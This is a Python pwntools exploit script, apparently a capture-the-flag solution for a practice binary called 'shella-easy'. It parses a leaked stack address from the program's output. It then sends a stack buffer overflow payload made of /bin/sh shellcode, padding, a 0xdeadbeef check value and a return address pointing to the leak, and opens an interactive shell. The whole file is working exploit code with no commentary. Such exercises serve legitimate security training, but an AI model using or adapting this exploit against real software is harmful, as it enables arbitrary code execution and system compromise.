#!/usr/bin/python3
from pwn import *
from re import *

context.log_level = 'ERROR'

context.binary = ELF("./shella-easy", checksec=False)
p = process()

line = p.recvline().decode().strip()
leaked_addr = int(search(r'0x[\da-f]+', line).group(), 16)

shellcode = asm(shellcraft.sh())
payload = shellcode + b"A" * (64 - len(shellcode)) + p32(0xdeadbeef) + b"B" * 8 + p32(leaked_addr)

p.sendline(payload)
p.interactive()
